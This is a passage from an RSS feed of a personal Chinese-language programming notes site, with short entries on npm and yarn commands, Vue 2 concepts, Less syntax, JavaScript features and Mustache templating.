var obj = { 	// 将全局中的变量定义为对象的属性，以减少全局中的变量 	msg: &amp;#39;命名空间模式&amp;#39;, 	fun() { 	console.log(this.msg); 	}, }; JavaScrip Two
obj.fun(); obj.msg = &amp;#39;对象中的 msg 被其他文件中的 js 代码修改了&amp;#39;; obj.fun(); IIFE 模式 将变量和函数定义到立即执行函数内部，并将方法暴露给 window，以一个匿名闭包（将一个模块暴露给 window 对象，然后在其其他模块中用 window 对象来访问这个这个模块）的方式实现了模块化。</description>
    </item>
    
    <item>
      <title>npm config</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-config/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-config/</guid>
      <description>npm config npm config get registry 查看源地址
npm config set registry 设置源地址</description>
    </item>
    
    <item>
      <title>npm init</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-init/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-init/</guid>
      <description>npm init 创建模块。用来初始化生成一个新的package.json文件。默认有一个引导界面，你可以一步步的配置，也可以通过带尾缀-f或-y来直接跳过引导界面。
npm init -y/npm init -f
创建模块，并直接跳过引导，直接生成一个默认的package.json文件。
使用-f创建，系统会提示npm WARN using &amp;ndash;force Recommended protections disabled.</description>
    </item>
    
    <item>
      <title>npm install</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-install/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-install/</guid>
      <description>npm install 在当前项目中，读取package.json里面的 dependencies 和devDependencies的配置来安装需要依赖的模块。
install 可简写为 i。
npm install jquery 在当前项目中安装 jquery 模块，默认安装的是最新版本。
npm install jquery -g 全局安装 jquery 模块，默认安装的是最新版本。
npm install jquery@3 安装 jquery 3.X.X 中的最新版本。
npm install jquery@3.0.1 安装指定版本的模块，也可用于将模块更新到指定版本。
npm install &amp;ndash;save --save是默认值，在 package.js文件的 dependencies 字段写入依赖，表示运行依赖（生产环境使用，项目上线后依旧会带着该模块）。
&amp;#34;dependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34; } npm install &amp;ndash;save-dev 在 package.js文件的 devDependencies 字段写入依赖，表示开发依赖（开发环境使用，项目上线后不会再带着该模块）。
&amp;#34;devDependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34; } </description>
    </item>
    
    <item>
      <title>npm install</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-run/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-run/</guid>
      <description>npm run package.json的scripts字段，可以用于指定脚本命令，供npm直接调用。npm run会创建一个 Shell，执行指定的命令。
start和test属于特殊命令，可以省略 run，其余的都得带上 run。
npm run的参数：
 如果不加任何参数，直接运行，会列出package.json里面所有可以执行的脚本命令 可配置参数，格式是加上两个连词线（&amp;ndash;）  </description>
    </item>
    
    <item>
      <title>npm list</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-list/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-list/</guid>
      <description>npm list 查看当前项目安装的所有模块。
npm list jquery 查看 jquery 模块的版本号。
npm list -g 查看本机全局安装的模块
npm list -g &amp;ndash;depth 0 列出全局安装的模块 带上[&amp;ndash;depth 0] 不深入到模块的支点 更简洁。</description>
    </item>
    
    <item>
      <title>npm package.json</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/package.json/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/package.json/</guid>
      <description>package.json 项目或模块的描述文件。
使用npm install安装模块的时候，会自动读取项目中package.json里面的 dependencies 和devDependencies的配置，来安装需要依赖的模块。
install 可简写为 i。
name 模块名。
version 模块版本号。
description 模块描述。
&amp;quot;^3.6.0&amp;quot;表示安装 3.X.X 中最新的版本。 &amp;quot;~3.6.0&amp;quot;表示安装 3.0.X 中最新的版本。
&amp;quot;3.6.0&amp;quot;若不加^或~，则表示指定安装3.6.0这个版本。
&amp;#34;dependencies&amp;#34;: {  &amp;#34;jquery&amp;#34;: &amp;#34;^3.6.0&amp;#34; } homepage 包的官网 url
contributors 模块的其他贡献者
main 程序的主入口文件。默认是模块根目录下的 index.js。
script 脚本。
repository 模块代码存放的地方，一般是版本控制器：git、svn等。
keywords 关键字
author 包的作者姓名
license dependencies/devDependencies 依赖包列表。
dependencies是运行时依赖的包。
devDependencies是开发时依赖的包。</description>
    </item>
    
    <item>
      <title>npm uninstall</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-uninstall/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-uninstall/</guid>
      <description>npm uninstall 卸载当前项目中的模块。
npm uninstall -g 卸载全局中的模块（慎用）</description>
    </item>
    
    <item>
      <title>npm update</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-update/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/npm-update/</guid>
      <description>npm update 将模块更新到最新版本
npm update jquery -g 更新指定全局模块。</description>
    </item>
    
    <item>
      <title>npm 基础命令</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%91%BD%E4%BB%A4/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</guid>
      <description>基础命令 npm -v 查看本机已安装的 npm 的版本
npm help 查看 npm 命令列表。</description>
    </item>
    
    <item>
      <title>Vue data</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/data/</guid>
      <description>data data 中的数据，不是直接在 Vue 实例中，而是在_data中，而_data在 Vue 实例中。
data 中的数据，Vue 使用了数据代理和数据劫持，从而实现了数据响应式。
书写方式 对象式 Vue 实例中使用对象式和函数式都可以。
data: {  name: &amp;#39;Vue 实例&amp;#39;, }, 函数式 在组件实例中必须使用函数式，否则会报错。
data() {  return {  name: &amp;#39;组件实例&amp;#39;,  }; }, </description>
    </item>
    
    <item>
      <title>Vue methods</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/methods/</guid>
      <description>methods methods 中的函数，其 this 都指向 Vue 实例或者组件实例对象。
任何 Vue 实例中的方法，只能使用普通函数，不能使用箭头函数，否则箭头函数中的 this 指向就不再是 Vue，而是 window。
var vm = new Vue({ 	el: &amp;#39;#root&amp;#39;, 	data: { 	name: &amp;#39;China&amp;#39;, 	},  // 方法 	methods: {  // 只能使用普通函数 	showInfo() { 	console.log(this); 	},  // 不能使用箭头函数  showInfo:()=&amp;gt; { 	console.log(this); 	}, 	}, 	}, }); Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue 键盘事件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E4%BA%8B%E4%BB%B6/%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6/</guid>
      <description>键盘事件 @键盘事件.按键key值
Vue 中常用的按键别名：
 回车：enter 删除：delete 退出：esc 空格：space 换行：tab（必须配合 keydow 使用，如果使用 keyup，那么按下 tab 后，当前元素会失去焦点，则元素的 keyup 事件则不会触发）  Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但要注意，部分按键的 key 值默认是大坨峰命名，需要转为短横线命名，比如CapsLock。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keydown.Caps-Lock=&amp;#39;showInfo&amp;#39;&amp;gt; 系统修饰键（用法特殊）： ctrl、 alt、 shift、 meta。
 配合 keyup 使用：按下修饰键的同时，再按下其他健，随后只释放其他健，事件才被触发。 配合 keydown 使用：正常触发事件。  自定义 KeyCode
使用 Vue.confing.keyCode.自定义键名 = KeyCode
键盘事件连写
表示按下 ctrl + y才能触发事件。
&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; @keyup.ctrl.y=&amp;#39;showInfo&amp;#39;&amp;gt; </description>
    </item>
    
    <item>
      <title>yarn</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn/</guid>
      <description>Yarn Yarn 在 npm5 之前，优势明显，但在 npm5 之后，两者差别不大。
安装 全局安装：
npm install -g yarn 如果以后要将 Yarn 更新到最新版本，请运行：
yarn set version latest 优点 速度快
 并行安装。 离线模式  安装版本统一
更简洁的输出。
多注册来源处理。
更好的命令语义化。</description>
    </item>
    
    <item>
      <title>yarn 命令</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn-add/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/yarn/yarn-add/</guid>
      <description>命令 yarn add 添加模块。
yarn remove 删除模块。
yarn add jquery &amp;ndash;dev 安装开发环境的jquery依赖。</description>
    </item>
    
    <item>
      <title>包管理器</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</link>
      <pubDate>Sun, 15 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</guid>
      <description>包管理器 </description>
    </item>
    
    <item>
      <title></title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E5%9F%BA%E7%A1%80/</guid>
      <description>基础 注释 // 开头的注释，less 不会将其编译到 css 文件中。
/**/ 包裹的注释，less 才会将其编译到 css 文件中
// 该注释不可见/* 该注释可见 */ 变量 使用@来申明一个变量: @color: #008c8c。
作为普通属性值只来使用：使用@color
作为选择器和属性名或 URL：@{attr}、@{class}、@{ur1}的形式。
// 属性值变量@color2: #2775e0;@color: #198484;// 选择器变量@class: .indiv;// 属性名变量@attr:width;div {// 使用属性名变量@{attr}: 100px;height: 100px;// 使用属性值变量background-color: @color2;// 使用选择器变量@{class}{width: 40px;height: 50px;background-color: @color;}} 被编译为：
div { 	width: 100px; 	height: 100px; 	background-color: #2775e0; } div .</description>
    </item>
    
    <item>
      <title>Less</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/less/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/less/</guid>
      <description>Less Less 一门向后兼容的 CSS 扩展语言。它扩展了 CSS，使 CSS 更易于维护和扩展。
Less 官方文档
安装 Node.js：
npm install -g less 引入：
&amp;lt;script src=&amp;#34;//cdnjs.cloudflare.com/ajax/libs/less.js/3.11.1/less.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 将 less 编译为 css 在 less 文件的目录引入执行，就会得到一个 编译后的 css 文件。
lessc styles.less &amp;gt; styles.css 当然，如果你使用的是 Vs Code，那么直接安装Easy Less扩展即可，每当你保存 less 文件的时候，它会自动将 less 文件编译为 css 文件，方便的很。</description>
    </item>
    
    <item>
      <title>Less 继承</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E7%BB%A7%E6%89%BF/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E7%BB%A7%E6%89%BF/</guid>
      <description>继承 使用 :extend()将混合规则集继承给指定的选择器。extend 是一个 Less 伪类
继承规则集不能带()。
// 定义一个继承，它不能有().center {position: absolute;left: 50%;top: 50%;transform: translate(-50%, -50%);}.wrap {width: 300px;height: 300px;background-color: aqua;.inner {// 将 .center 中的规则集继承到 .wrap .inner{} 中// 使用 all&amp;amp;:extend(.center);&amp;amp;:nth-child(1) {width: 500px;height: 100px;background-color: pink;}&amp;amp;:nth-child(2) {width: 80px;height: 80px;background-color: rgb(210, 29, 59);}}} </description>
    </item>
    
    <item>
      <title>Vue MVVM</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mvvm/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mvvm/</guid>
      <description>MVVM 双向数据绑定，数据影响视图，视图影响数据
M：模型，指 data 中的数据。
V：视图，指模板。
VM：视图模型，指 Vue 实例对象。
data 中的所有属性，最后都出现在了 Vue 实例上。
vue 实例上的所有属性，以及 Vue 原型上的所有属性，在 Vue 模板中国都可以直接使用。</description>
    </item>
    
    <item>
      <title>Vue set</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E5%85%A8%E5%B1%80-api/set/</guid>
      <description>set 给响应式对象添加一个属性，并且这个新属性是响应式的，因此，且会触发视图的更新。
该对象必须是响应式对象，因为 Vue 无法探测普通的新增属性。
该对象不能是 Vue 实例，或者 Vue 实例的根数据对象：data、。
如果响应式对象为 array，则第二个参数为 index.</description>
    </item>
    
    <item>
      <title>Vue 插值语法</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E6%8F%92%E5%80%BC%E8%AF%AD%E6%B3%95/</guid>
      <description>插值语法 用于解析元素包含的内容，一般使用{{name}}来进行插值，其中name必须是 JavaScrip 表达式，且可以直接读取data中的所有数据。
&amp;lt;!-- 插值语法 --&amp;gt; &amp;lt;h1&amp;gt;hello！{{name}}&amp;lt;/h1&amp;gt; </description>
    </item>
    
    <item>
      <title>哈夫曼树</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/</link>
      <pubDate>Sat, 14 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/</guid>
      <description>哈夫曼树 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;queue&amp;gt;using namespace std;  typedef struct node{ 	int data; 	struct node *lchild, *rchild; } n;  //创建一个节点 node * get_a_node(int data){ 	node *c = (node *)malloc(sizeof(node)); 	c-&amp;gt;data = data; 	c-&amp;gt;lchild = 0; 	c-&amp;gt;rchild = 0; 	return c; }   int main(){ 	queue&amp;lt;node *&amp;gt;q; 	//构建一棵树 	node *t = get_a_node(1); 	t-&amp;gt;lchild = get_a_node(2); 	t-&amp;gt;rchild = get_a_node(3); 	t-&amp;gt;lchild-&amp;gt;rchild = get_a_node(5); 	t-&amp;gt;rchild-&amp;gt;rchild = get_a_node(7); 	t-&amp;gt;rchild-&amp;gt;rchild-&amp;gt;lchild = get_a_node(14);  	q.</description>
    </item>
    
    <item>
      <title>Vue style</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/style/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/style/</guid>
      <description>style scoped 默认情况，给不同的组件书写 CSS 样式，最终都会汇总到一个文件，这极有可能导致样式覆盖等问题。
因此，我们可以给组件中的给&amp;lt;style&amp;gt;添加scoped属性，以表示它的样式只作用于当前模块，很好的实现了样式私有化的目的，这是一个非常好的机制。
&amp;lt;style scoped&amp;gt; .demo { 	font-size: 2rem; } &amp;lt;/style&amp;gt; 使用该属性后，它会给组件添加唯一的自定义属性，使我们原本的 CSS 选择器变为 CSS 属性选择器，使得该组件的样式是私有化。
为什么要慎用 在实际业务中我们往往会对公共组件样式做细微的调整，如果添加了scoped属性，那么样式将会变得不易修改。
lang 配置当前&amp;lt;style&amp;gt;中所使用的语言，使得 Vue 可以解析。例如：lees
&amp;lt;style lang=&amp;#34;less&amp;#34;&amp;gt; .demo { 	font-size: 2rem; 	.sub { 	color: rgb(59, 119, 123); 	} } &amp;lt;/style&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 使用组件</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E4%BD%BF%E7%94%A8%E7%BB%84%E4%BB%B6/</guid>
      <description>使用组件 组件之间可以嵌套。
使用组件分为三步：
 定义组件。 注册组件。 应用组件。  组件名 -命名法：任何环境都可以使用。
大坨峰命名法：只能在脚手架环境下使用（更推荐）。
组件名应尽可能避免与 HTML 已有的元素重名。
定义组件 组件无el配置项。
data 必须是一个函数，该函数返回的对象作为该组件的数据。避免组件被复用时，其数据还存在引用关系。
由于没有el，组件的虚拟 DOM 树必须定义在template 或 render()中。
创建组件的时候，可以使用 name配置项指定当前组件在 Vue 开发者工具中所呈现的名字。
const Student = Vue.extend({ 	// 指定组件名 	name: &amp;#39;Rainy&amp;#39;, 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{studentName}}&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	studentName: &amp;#39;忧心&amp;#39;, 	}; 	}, }); 简写 简写方式定义组件，虽然我们没有调用 Vue.extend()方法，但实际上当我们注册组件时， Vue 会帮我们调用该方法。
const School = { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;哈佛&amp;#39;, 	}; 	}, }; 注册组件 局部注册组件 只能在当前实例 el 所指定的容器中使用的组件。</description>
    </item>
    
    <item>
      <title>Vue 插槽</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E6%8F%92%E6%A7%BD/</guid>
      <description>插槽 单个插槽。将一个组件的内容，传递到&amp;lt;slot&amp;gt;&amp;lt;/solt&amp;gt;中。
&amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt; 具名插槽 有时我们需要多个插槽，就需要给 &amp;lt;slot&amp;gt; 带上一个名字。
一个不带 name 的 &amp;lt;slot&amp;gt; 出口会带有隐含的名字“default”。</description>
    </item>
    
    <item>
      <title>Vue 组件树</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6%E6%A0%91/</guid>
      <description>组件树 一个组件创建好后，往往会在各种地方使用它。它可能多次出现在 Vue 实例中，也可能出现在其他组件实例中，于是就形成了一棵组件树。</description>
    </item>
    
    <item>
      <title>Vue 重要的内置关系</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB/</guid>
      <description>重要的内置关系 VueConponent.prototype.__proto__ === Vue.prototype
为什么要有这个关系？
让该组件实例对象可以访问到 Vue 原型上的属性和方法。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; JavaScrip
// VueComponent 的实例对象 school const school = { 	template: ` &amp;lt;div&amp;gt; &amp;lt;h1&amp;gt;{{schoolName}}&amp;lt;/h1&amp;gt; &amp;lt;button @click=&amp;#39;fun&amp;#39;&amp;gt;点击&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; `, 	data() { 	return { 	schoolName: &amp;#39;哈佛&amp;#39;, 	}; 	}, 	methods: { 	fun() { 	// 调用 school 上没有的 val 	console.log(this.val); 	}, 	}, }; Vue.component(&amp;#39;school&amp;#39;, school);  // Vue new Vue({ 	template: `&amp;lt;school&amp;gt;&amp;lt;/school&amp;gt;`, 	el: &amp;#39;#app&amp;#39;, 	data: {}, }); // Vue 的 prototype Vue.</description>
    </item>
    
    <item>
      <title>VueCli</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vuecli/vuecli/</link>
      <pubDate>Fri, 13 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vuecli/vuecli/</guid>
      <description>VueCli 安装 全局安装：
npm install -g @vue/cli 安装完成后，用命令检查安装的版本
vue --version 创建项目 vue create vue-cli 接下来就是一些导航选择，根据自己选择即可。
运行工程 创建完成后，用cd进入 vue-cli 目录，再用npm run serve启动工程，出现以下提示即为运行成功：
 App running at:  - Local: http://localhost:8080/  - Network: unavailable Local：它会将工程托管到本地的一个服务器地址 http://localhost:8080/。
Network：运行时的网络状态。
项目中的目录文件 node_modules：保存着 Vue 所有直接或间接依赖的第三方库。
public：保存着页面模板。
src：源代码目录。
package.json：工程配置文件
  serve：开发环境，它会将工程托管到一个本地服务器进行预览。
  build：生产环境，它会将工程打包成一个dist文件夹，这个文件夹就是我们工程的源代码
  vue.config.js：vue-cli 的配置文件，大部分都配置都是 webpack 配置
 &amp;#34;scripts&amp;#34;: {&amp;#34;serve&amp;#34;: &amp;#34;vue-cli-service serve&amp;#34;,&amp;#34;build&amp;#34;: &amp;#34;vue-cli-service build&amp;#34;}, 还原工程 使用npm install，它会根据package.json文件中的dependencies和devDependencies来还原node_modules目录
配置二年级</description>
    </item>
    
    <item>
      <title>JavaScript Object 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/object/objet-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/object/objet-%E6%96%B9%E6%B3%95/</guid>
      <description>Object 方法 defineProperty() 用于在一个对象上定义一个新属性，或者修改一个对象的已有属性，并返回此对象。
使用 defineProperty() 定义的属性无法被枚举。
value 该属性对应的值。默认值为undefined。
enumerable 控制属性是否可以被枚举。
可枚举属性是指那些内部enumerable设置为 true 的属性，对于通过直接的赋值和属性初始化的属性，该标识值默认为即为 true，对于通过Object.defineProperty() 等定义的属性，该标识值默认为 false。
writable 控制属性是否可以被修改，默认值为false
configurable 控制属性是否可以被删除，默认值为false
get() 当访问当前属性时，会调用此函数。该函数的返回值会被用作当前属性的值。
set() 当前属性值被修改时，会调用此函数。该方法接受一个参数（当前属性被赋予的新值），会传入赋值时的 this 对象。
var number = 20; var person = { 	Name: &amp;#39;张三&amp;#39;, 	sex: &amp;#39;男&amp;#39;, 	// age: 25, }; Object.defineProperty(person, &amp;#39;age&amp;#39;, { 	// 每当我们读取 person 的 age 属性时，get() 就会被调用，且返回值是 age 的值 	get() { 	console.log(&amp;#39;读取 age 的值&amp;#39;); 	return number; 	}, 	// 每当我们修改 person 的 age 属性时，set() 就会被调用，且会收到被修改后的的值 	set(value) { 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 箭头函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/</guid>
      <description>箭头函数 任何可以使用匿名函数的位置均可以使用箭头函数。
箭头函数适合与 this 无关的回调，不适合与 this 有关的回调。
// 普通匿名函数 var sum = function (a, b) { 	return a + b; }; console.log(sum(1, 2)); // 箭头函数 var sumES6 = (a, b) =&amp;gt; { 	return a + b; }; console.log(sumES6(4, 3)); 可以看出，定义箭头函在数语法上要比普通函数简洁得多。
参数 没有参数，直接写一个空括号()即可。
只有一个参数，可以省去包裹参数的括号。
多个参数，将参数依次用逗号(,)分隔。
// 无参数 var fun1 = () =&amp;gt; { 	console.log(&amp;#39;无参数&amp;#39;); };  // 只有一个参数 var fun2 = (name) =&amp;gt; { 	console.log(name); };  // 多个参数 var fun3 = (val1, val2, val3) =&amp;gt; { 	return [val1, val2, val3]; }; 函数体 如果箭头函数的函数体中只有一句代码，可以省去函数体的大括号{ }，此时rturn 必须省略。</description>
    </item>
    
    <item>
      <title>JavaScript 语法糖</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E6%B3%95%E7%B3%96/</link>
      <pubDate>Wed, 11 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E6%B3%95%E7%B3%96/</guid>
      <description>语法糖 对象属性简写 简写对象的属性以及方法。
var name = &amp;#39;月色&amp;#39;; var age = 20; var sex = &amp;#39;男&amp;#39;; // 传统对象的属性 var person = { 	name: name, 	age: age, 	Fun: function () { 	console.log(sex); 	}, }; // 语法糖对象的属性 var personES6 = { 	name, 	age, 	Fun() { 	console.log(sex); 	}, }; console.log(person); console.log(personES6); 模板字符串 用反引号``声明（传统字符串是双引号或单引号）。
通过模板字符串，你可以以${表达式}的形式在模板中插入任何 JavaScript 表达式、变量。
默认支持多行，无需使用\n来换行。
var person = { 	name: &amp;#39;Rainy&amp;#39;, 	age: &amp;#39;20&amp;#39;, }; // 传统字符串拼接 var str = &amp;#39;my name is &amp;#39; + person.</description>
    </item>
    
    <item>
      <title>Mustache</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mustache/</link>
      <pubDate>Tue, 10 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/mustache/</guid>
      <description>Mustache Mustache 是一个 轻逻辑放模板解析引擎。
小程序的 wxml 中的代码、Vue 中的插值都是用的 mustache。
语法 {{keyName}} 简单的变量替换。
{{{keyName}}} 输出会将等特殊字符转译，如果想保持内容原样输出可以使用{{{}}}。
{{#keyName}} {{/keyName}} 以#开始、以/结束表示区块，它会根据当前上下文中的键值来对区块进行一次或多次渲染。它的功能很强大，有类似 if、foreach 的功能。
{{^keyName}} {{/keyName}} 该语法与{{#keyName}} {{/keyName}} 类似，不同在于它是当 keyName 值为 null, undefined, false 时才渲染输出该区块内容。
